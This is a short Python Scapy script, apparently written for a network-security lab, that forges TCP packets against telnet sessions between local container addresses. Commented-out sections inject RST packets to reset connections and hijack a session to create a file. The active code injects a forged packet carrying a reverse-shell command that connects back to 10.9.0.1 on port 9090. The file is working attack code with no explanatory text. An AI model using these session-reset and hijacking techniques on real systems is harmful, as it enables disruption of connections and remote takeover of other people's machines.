#!/usr/bin/env python3
from scapy.all import *
'''
ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=50198, flags="R", seq=3923963586)

pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
'''

'''
# V2
def spoof_telnet(pkt):
	ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].seq+len(pkt[TCP].payload))
	pkt = ip/tcp
	ls(pkt)
	send(pkt, verbose=0)

pkt = sniff(iface='br-f209b17304ec', filter='port 23', prn=spoof_telnet) 

'''
'''def spoof_telnet(pkt):
	ip = IP(src="10.9.0.6", dst="10.9.0.5")
	tcp = TCP(sport=pkt[TCP].sport, dport=23, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
	data = "/r touch attacker_was_here.txt /r"
	pkt = ip/tcp/data
	ls(pkt)
	send(pkt, verbose=0)
	
pkt = sniff(iface='br-f209b17304ec', filter='port 23', prn=spoof_telnet) 
'''

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=50598, dport=23, flags="A", seq=2736535545, ack=625647925)
data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

